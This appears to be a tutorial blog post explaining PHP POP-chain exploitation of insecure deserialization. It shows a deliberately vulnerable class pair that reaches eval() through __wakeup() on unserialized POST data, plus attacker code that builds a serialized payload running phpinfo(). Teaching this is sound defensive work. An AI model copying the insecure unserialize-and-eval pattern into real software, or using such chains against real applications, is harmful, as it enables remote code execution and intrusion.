---
title: "PHP Pop Chains"
categories:
  - Insecure Deserialization
---

Achieving RCE with POP chain exploits.

Last time, we talked about how PHP's unserialize() can introduce serious vulnerabilities if it is given user-controlled input.

In a nutshell, when an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like \_\_wakeup().

This works... sometimes. The problem is this: what if the declared magic methods of the class do not contain any useful code in terms of exploitation? Then the unsafe deserialization is useless and the exploit is bust, right?

Unfortunately, even if the magic methods themselves are not exploitable, an attacker could still wreak havoc using something called POP chains. POP stands for Property Oriented Programming, and the name comes from the fact that the attacker can control all of the properties of the deserialized object. Similar to ROP attacks (Return Oriented Programming), POP chains work by chaining code "gadgets" together to achieve the attacker's ultimate goal. These "gadgets" are code snippets borrowed from the codebase that the attacker uses to further her goal.

## An example chain

POP chains use magic methods as the initial gadget, which then calls other gadgets. Consider the following example:

```php
class Example{

   private $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __wakeup()
   {
      if (isset($this->obj)) return $this->obj->evaluate();
   }
}

class CodeSnippet{

   private $code;

   function evaluate()
   {
      eval($this->code);
   }
}

// some PHP code...

$user_data = unserialize($_POST['data']);

// some PHP code...
```

In this example, there are two classes defined: Example and CodeSnippet.

Example has a property named obj and when an Example object is deserialized, its \_\_wakeup() function is called, and the evaluate() method of obj is called.

The CodeSnippet class has a property named code, which contains the code string to be executed, and an evaluate() method, which calls eval() on the code string.

The program takes in POST parameter data from the user, and calls unserialize() on data.

### What can the attacker do?

An attacker can use the following code to generate the injected serialized object:

```php
class CodeSnippet
{
   private $code = "phpinfo();";
}

class Example
{
   private $obj;

   function __construct()
   {
      $this->obj = new CodeSnippet;
   }
}

print urlencode(serialize(new Example));
```

What this block of code does is the following:

1.  Define a class named CodeSnippet, and set its code property to "phpinfo();".
2.  Define a class named Example, and set its obj property to a new instance to a new CodeSnippet instance on instantiation.
3.  Create an Example instance, serialize and URL encode the serialized string.

The attacker can then feed the generated string into the POST parameter data, and this is what the program would do:

1.  Unserialize the object, create an Example instance.
2.  Call \_\_wakeup(), see that the obj property is set to a CodeSnippet instance.
3.  Call the evaluate() method of the obj, which runs eval("phpinfo();").

This is how an attacker can achieve RCE by chaining and reusing code found in the application's codebase.

* * * * *

As always, thanks for reading! Next time, we go into more object injection, what you can do with it and sample attack scenarios!